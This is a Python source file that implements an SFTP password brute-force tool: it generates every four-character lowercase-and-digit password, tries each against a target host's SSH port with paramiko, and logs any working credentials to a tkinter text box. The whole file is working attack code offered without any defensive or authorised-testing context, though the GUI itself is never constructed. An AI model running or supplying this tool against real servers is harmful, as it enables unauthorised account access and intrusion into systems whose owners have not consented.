import itertools  # Import itertools for generating combinations of passwords
import string  # Import string for character sets
import paramiko  # Import paramiko for SFTP connections
import tkinter as tk  # Import tkinter to create a GUI
from concurrent.futures import ThreadPoolExecutor  # Import ThreadPoolExecutor for concurrent execution
import time  # Import time for sleep functionality
import os  # Import os for file operations
import random  # Import random for generating random data

# Function to perform a single SFTP connection attempt
def attempt_connection_sftp(host, user, password, output_text, stop_event):
    """Attempt to connect to the SFTP server with the given credentials."""
    while not stop_event.is_set():  # Continue until a stop signal is received
        output_text.insert(tk.END, f"[+] Checking SFTP password: {password} for user: {user} on host: {host}\n")  # Log the attempt
        try:
            transport = paramiko.Transport((host, 22))  # Create a transport object for SFTP (default port 22)
            transport.connect(username=user, password=password)  # Attempt to connect with the provided credentials
            sftp = paramiko.SFTPClient.from_transport(transport)  # Create an SFTP client from the transport
            output_text.insert(tk.END, f"[+] Found SFTP credentials: {user}:{password}\n")  # Log successful credentials
            sftp.close()  # Close the SFTP connection
            transport.close()  # Close the transport connection
            return True  # Indicate success
        except paramiko.AuthenticationException:
            return False  # Return False for invalid credentials
        except Exception as e:
            output_text.insert(tk.END, f"[X] Exception: {e}\n")  # Print any other exceptions
            return False  # Indicate failure

# Function to perform brute force attack
def brute_force_attack(host, user, output_text, stop_event):
    """Perform a brute force attack on the SFTP server using a generated password list."""
    charset = string.ascii_lowercase + string.digits  # Define the character set (lowercase letters and digits)
    fixed_length = 4  # Set the fixed password length to 4 characters

    # Create a ThreadPoolExecutor for concurrent password attempts
    with ThreadPoolExecutor(max_workers=10) as executor:
        # Generate passwords one at a time using itertools
        for password_tuple in itertools.product(charset, repeat=fixed_length):
            password = ''.join(password_tuple)  # Join the tuple to form a password string
            output_text.delete(1.0, tk.END)  # Clear previous output in the GUI
            output_text.insert(tk.END, f"[+] Checking password: {password}\n")  # Log the current password being checked
            
            # Check for stop signal to terminate the attack
            if stop_event.is_set():  # If a stop signal is received
                break  # Exit the loop

            # Submit the connection attempt to the executor
            future = executor.submit(attempt_connection_sftp, host, user, password, output_text, stop_event)
            if future.result():  # If the connection attempt was successful
                break  # Exit the loop if valid credentials are found
            
            # Introduce a small delay between attempts to avoid overwhelming the server
            time.sleep(0.04)  # Delay for 40 milliseconds (adjust as needed)

    output_text.insert(tk.END, "[+] Finished brute force attack.\n")  # Indicate that the attack is complete